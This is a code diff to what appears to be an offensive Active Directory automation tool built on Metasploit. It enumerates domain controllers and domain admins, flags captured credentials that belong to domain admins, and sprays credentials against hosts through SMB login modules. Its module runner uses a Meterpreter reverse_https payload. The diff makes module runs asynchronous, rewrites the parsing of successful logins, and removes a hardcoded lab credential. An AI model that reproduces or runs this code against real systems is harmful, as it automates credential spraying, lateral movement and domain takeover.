@@ -63,6 +63,7 @@ def print_great(msg, sess_num):
 def kill_tasks():
     print()
     print_info('Killing tasks then exiting', None)
+    embed()
     del_unchecked_hosts_files()
     for task in asyncio.Task.all_tasks():
         task.cancel()
@@ -330,7 +331,7 @@ async def get_domain_controllers(client, sess_num):
     if err:
         return
 
-    else:
+    if len(DOMAIN_DATA['domain_controllers']) == 0:
         output = output.decode('utf8')
         if 'Domain Controller: ' in output:
             dc = output.split('Domain Controller: ')[-1].strip()
@@ -350,6 +351,7 @@ async def get_domain_admins(client, sess_num, ran_once):
     if err:
         return
 
+
     output = output.decode('utf8')
     da_line_start = '[*] \t'
 
@@ -360,7 +362,8 @@ async def get_domain_admins(client, sess_num, ran_once):
         for l in split_output:
             if l.startswith(da_line_start):
                 domain_admin = l.split(da_line_start)[-1].strip()
-                domain_admins.append(domain_admin)
+                if len(domain_admin) > 0:
+                    domain_admins.append(domain_admin)
 
         for x in domain_admins:
             if x not in DOMAIN_DATA['domain_admins']:
@@ -383,12 +386,10 @@ async def get_DCs_DAs(client, sess_num):
     if b'domain' in NEW_SESS_DATA[sess_num]:
         DOMAIN_DATA['domain'] = NEW_SESS_DATA[sess_num][b'domain'].decode('utf8')
 
-    # If no domain admin list found yet then find them
-    if NEW_SESS_DATA[sess_num][b'domain_joined'] == b'True':
-        if len(DOMAIN_DATA['domain_admins']) == 0:
-            await get_domain_admins(client, sess_num, False)
-        if len(DOMAIN_DATA['domain_controllers']) == 0:
-            await get_domain_controllers(client, sess_num)
+    if len(DOMAIN_DATA['domain_admins']) == 0:
+        await get_domain_admins(client, sess_num, False)
+    if len(DOMAIN_DATA['domain_controllers']) == 0:
+        await get_domain_controllers(client, sess_num)
 
 def update_session(session, sess_num):
     global NEW_SESS_DATA
@@ -499,9 +500,15 @@ async def check_for_DA(creds):
 
     da_creds = False
 
-    # Got dom/user:hash
+    if '\\'in creds:
+        username_pw = creds.split('\\')[1]
+        username = username_pw.split(':')[0]
+        if len([da for da in DOMAIN_DATA['domain_admins'] if username in da]) > 0:
+            print_great('Potential domain admin found! '+creds, None)
+
+    # Got dom\user:pw
     if creds in DOMAIN_DATA['domain_admins']:
-        print_great('Potential domain admin found! '+creds)
+        print_great('Potential domain admin found! '+creds, None)
         da_creds = True
         plaintext = True
 
@@ -563,13 +570,14 @@ def get_console_ids(client):
 
     return c_ids
 
-async def run_msf_module(client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs):
+async def run_msf_module(fut, client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs):
 
     payload = 'windows/meterpreter/reverse_https'
     cmd = create_msf_cmd(mod, rhost_var, target, lhost, payload, extra_opts, start_cmd)
     mod_out = await run_console_cmd(client, c_id, cmd, end_strs)
 
-    return mod_out
+    #return mod_out
+    fut.set_result(mod_out)
 
 def create_msf_cmd(module_path, rhost_var, target, lhost, payload, extra_opts, start_cmd):
     cmds = ('use {}\n'
@@ -676,25 +684,30 @@ async def spread(client, c_ids, lhost):
             end_strs = [b'Auxiliary module execution completed']
 
             c_id = await get_nonbusy_cid(client, c_ids)
-            output = await run_msf_module(client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs)
-            if output:
-                parse_smb_login(output)
+            print_info('Spraying credentials [{}] against hosts'.format(user), None)
+            #await run_msf_module(client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs))
+            fut = asyncio.Future()
+            task = asyncio.ensure_future(run_msf_module(fut, client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs))
+            task.add_done_callback(parse_smb_login)
 
-def parse_smb_login(output):
+def parse_smb_login(fut):
+    output = fut.result()
     out_split = output.splitlines()
-    admin = None
+    admin = False
     user = None
     for l in out_split:
+        l = l.strip()
         if b'- Success: ' in l:
-            line_split = l.split()
-            ip = line_split[1].decode('utf8')
-            user = line_split[6].strip(b"'").decode('utf8')
-            if len(line_split) > 6:
-                admin = line_split[7]
+            l = l.decode('utf8')
+            ip = l.split()[1]
+            user = l.split("Success: '")[1]
+            if l.endswith("' Administrator"):
+                admin = True
+
             if admin:
                 print_good('Admin login found! {} - {}'.format(ip, user), None)
             else:
-                print_info('Nonadministrator login found {} - {}'.format(ip, user))
+                print_info('Non-admin login found {} - {}'.format(ip, user), None)
 
 def create_hostsfile(c):
     global DOMAIN_DATA
@@ -1002,10 +1015,6 @@ def parse_hostlist(args):
     DOMAIN_DATA['hosts'] = hosts
 
 def main(args):
-
-    ######
-    DOMAIN_DATA['creds'].append('lab2\dan.da:Qwerty1da')
-    #####
 
     if args.hostlist or args.xml:
         parse_hostlist(args)
